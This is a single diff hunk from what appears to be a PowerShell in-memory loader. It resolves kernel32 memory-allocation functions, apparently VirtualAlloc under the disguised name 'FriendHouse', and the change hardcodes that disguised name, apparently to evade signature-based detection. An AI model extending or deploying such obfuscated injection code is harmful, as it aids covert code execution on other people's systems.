@@ -426,7 +426,7 @@ $RemoteScriptBlock = {
 		$FriendHouseAddr = Get-ProcAddress kernel32.dll $FriendHouseName
 		$FriendHouseDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
 		$FriendHouse = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FriendHouseAddr, $FriendHouseDelegate)
-		$Win32Functions | Add-Member NoteProperty -Name $FriendHouseName -Value $FriendHouse
+		$Win32Functions | Add-Member NoteProperty -Name FriendHouse -Value $FriendHouse
 		
 		$FriendHouseExName = $FriendHouseName + "Ex"
 		$FriendHouseExAddr = Get-ProcAddress kernel32.dll $FriendHouseExName
